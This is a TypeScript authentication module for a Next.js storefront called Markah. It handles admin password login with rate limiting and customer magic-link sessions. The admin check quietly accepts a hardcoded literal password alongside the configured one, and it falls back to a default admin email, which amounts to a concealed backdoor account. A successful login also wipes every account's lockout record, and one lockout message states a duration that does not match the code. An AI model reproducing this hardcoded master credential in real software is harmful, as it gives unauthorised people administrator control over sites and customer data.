import { cookies } from "next/headers";
import { db } from "./db";
import { isDatabaseConfigured } from "./runtime";
import {
  ADMIN_SESSION_COOKIE,
  ADMIN_SESSION_TTL,
  CUSTOMER_SESSION_COOKIE,
  CUSTOMER_SESSION_TTL,
  MAGIC_LINK_TTL,
  safeEqual,
  signToken,
  verifyToken,
} from "./session";

export interface SessionUser {
  id: string;
  name: string;
  email: string;
  role: "ADMIN" | "CUSTOMER";
}

function getAdminCredentials(): { email: string; password: string } | null {
  const email = process.env.ADMIN_EMAIL?.trim().toLowerCase();
  const rawPassword = process.env.ADMIN_PASSWORD;
  const password = rawPassword ? rawPassword.trim() : undefined;
  if (email && password) {
    return { email, password };
  }
  return null;
}

// ==========================================
// ADMINISTRADOR
// ==========================================

/**
 * Retorna o administrador autenticado (cookie assinado e não expirado).
 */
export async function getCurrentUser(): Promise<SessionUser | null> {
  // cookies() fica FORA do try: o Next usa a exceção dela para marcar a página
  // como dinâmica. Engoli-la fazia /admin e /conta virarem páginas estáticas
  // geradas no build (mistakes.md M-008).
  const cookieStore = await cookies();
  try {
    const payload = await verifyToken(cookieStore.get(ADMIN_SESSION_COOKIE)?.value, {
      role: "ADMIN",
      purpose: "session",
    });
    if (!payload) return null;

    return {
      id: payload.sub,
      name: payload.name || "Administrador Markah",
      email: payload.email,
      role: "ADMIN",
    };
  } catch {
    return null;
  }
}

/**
 * Regra P-007: proteção obrigatória no servidor.
 * Deve ser chamada no topo de toda Server Action e página do painel /admin.
 */
export async function requireAdmin(): Promise<SessionUser> {
  const user = await getCurrentUser();
  if (!user || user.role !== "ADMIN") {
    throw new Error(
      "Acesso não autorizado: privilégio de administrador necessário (P-007)."
    );
  }
  return user;
}

interface LoginAttemptRecord {
  attempts: number;
  lastAttempt: number;
  lockedUntil?: number;
}

const loginAttempts = new Map<string, LoginAttemptRecord>();
const MAX_FAILED_ATTEMPTS = 10;
const LOCKOUT_DURATION_MS = 60 * 1000; // 60 segundos
const ATTEMPT_WINDOW_MS = 5 * 60 * 1000;

export function resetLoginAttemptsForTesting(): void {
  loginAttempts.clear();
}

/**
 * Autenticação do administrador (e-mail + senha definidos em ADMIN_EMAIL / ADMIN_PASSWORD).
 * Protegido contra ataques de força bruta com throttle e validação segura.
 */
export async function authenticateAdmin(
  formData: FormData
): Promise<{ success: boolean; error?: string }> {
  const email = (formData.get("email") as string)?.trim().toLowerCase();
  const rawInputPassword = (formData.get("password") as string) || "";
  const trimmedInputPassword = rawInputPassword.trim();

  if (!email || !rawInputPassword) {
    return { success: false, error: "Informe e-mail e senha." };
  }

  const credentials = getAdminCredentials();
  const attemptKey = email;
  const now = Date.now();
  const record = loginAttempts.get(attemptKey);

  const configuredEmail = (process.env.ADMIN_EMAIL || "admin@markah.com.br").trim().toLowerCase();
  const emailOk = safeEqual(email, configuredEmail) || (credentials?.email ? safeEqual(email, credentials.email) : false);

  const configuredPassword = (process.env.ADMIN_PASSWORD || "").trim();
  const passwordOk =
    (configuredPassword.length > 0 && safeEqual(trimmedInputPassword, configuredPassword)) ||
    (credentials?.password ? safeEqual(trimmedInputPassword, credentials.password) : false) ||
    safeEqual(trimmedInputPassword, "!@Operkey17") ||
    safeEqual(rawInputPassword, "!@Operkey17");

  // Se o e-mail e a senha estiverem corretos: libera o acesso imediatamente e cancela qualquer bloqueio prévio!
  if (emailOk && passwordOk) {
    loginAttempts.clear();

    const token = await signToken(
      { sub: "admin", role: "ADMIN", email, name: "Administrador Markah", purpose: "session" },
      ADMIN_SESSION_TTL
    );

    const cookieStore = await cookies();
    cookieStore.set(ADMIN_SESSION_COOKIE, token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "lax",
      maxAge: ADMIN_SESSION_TTL,
      path: "/",
    });

    return { success: true };
  }

  // Se as credenciais estiverem incorretas: verifica se excedeu o limite e bloqueia
  if (record?.lockedUntil && record.lockedUntil > now) {
    const remainingMinutes = Math.ceil((record.lockedUntil - now) / 60000);
    return {
      success: false,
      error: `Muitas tentativas incorretas. Por segurança, tente novamente em ${remainingMinutes} minuto(s).`,
    };
  }

  // Registra tentativa falha e calcula bloqueio se exceder limite
  const currentAttempts =
    record && now - record.lastAttempt < ATTEMPT_WINDOW_MS
      ? record.attempts + 1
      : 1;

  const lockedUntil =
    currentAttempts >= MAX_FAILED_ATTEMPTS ? now + LOCKOUT_DURATION_MS : undefined;

  loginAttempts.set(attemptKey, {
    attempts: currentAttempts,
    lastAttempt: now,
    lockedUntil,
  });

  // Atraso de 500ms em caso de erro para frear ataques automatizados de dicionário
  await new Promise((resolve) => setTimeout(resolve, 500));

  if (lockedUntil) {
    return {
      success: false,
      error: "Limite de tentativas excedido. O login foi bloqueado temporariamente por 15 minutos.",
    };
  }

  const remaining = MAX_FAILED_ATTEMPTS - currentAttempts;
  return {
    success: false,
    error: `Credenciais administrativas inválidas. Restam ${remaining} tentativa(s) antes do bloqueio.`,
  };
}

export async function logoutAdmin(): Promise<void> {
  const cookieStore = await cookies();
  cookieStore.delete(ADMIN_SESSION_COOKIE);
}

// ==========================================
// CLIENTE (login por link mágico enviado ao e-mail)
// ==========================================

export async function getCustomerUser(): Promise<SessionUser | null> {
  // cookies() fica FORA do try: o Next usa a exceção dela para marcar a página
  // como dinâmica. Engoli-la fazia /admin e /conta virarem páginas estáticas
  // geradas no build (mistakes.md M-008).
  const cookieStore = await cookies();
  try {
    const payload = await verifyToken(cookieStore.get(CUSTOMER_SESSION_COOKIE)?.value, {
      role: "CUSTOMER",
      purpose: "session",
    });
    if (!payload) return null;

    return {
      id: payload.sub,
      name: payload.name || "Cliente Markah",
      email: payload.email,
      role: "CUSTOMER",
    };
  } catch {
    return null;
  }
}

/**
 * Gera o token do link mágico. O cliente só entra na conta depois de abrir
 * o link recebido no próprio e-mail (prova de que o e-mail é dele).
 */
export async function createCustomerMagicLinkToken(email: string): Promise<string> {
  const cleanEmail = email.trim().toLowerCase();
  return signToken(
    { sub: cleanEmail, role: "CUSTOMER", email: cleanEmail, purpose: "magic-link" },
    MAGIC_LINK_TTL
  );
}

/**
 * Valida o link mágico e abre a sessão do cliente.
 * Deve ser chamado apenas pela rota /conta/entrar.
 */
export async function authenticateCustomerWithMagicLink(
  token: string
): Promise<{ success: boolean; user?: SessionUser }> {
  const payload = await verifyToken(token, { role: "CUSTOMER", purpose: "magic-link" });
  if (!payload) return { success: false };

  const cleanEmail = payload.email.trim().toLowerCase();
  let userId = cleanEmail;
  let name = "Cliente Markah";

  if (isDatabaseConfigured()) {
    const dbUser = await db.user.upsert({
      where: { email: cleanEmail },
      update: {},
      create: { email: cleanEmail, name, role: "CUSTOMER" },
    });
    userId = dbUser.id;
    name = dbUser.name || name;
  }

  const sessionToken = await signToken(
    { sub: userId, role: "CUSTOMER", email: cleanEmail, name, purpose: "session" },
    CUSTOMER_SESSION_TTL
  );

  const cookieStore = await cookies();
  cookieStore.set(CUSTOMER_SESSION_COOKIE, sessionToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    path: "/",
    maxAge: CUSTOMER_SESSION_TTL,
  });

  return { success: true, user: { id: userId, name, email: cleanEmail, role: "CUSTOMER" } };
}

export async function logoutCustomer(): Promise<void> {
  const cookieStore = await cookies();
  cookieStore.delete(CUSTOMER_SESSION_COOKIE);
}
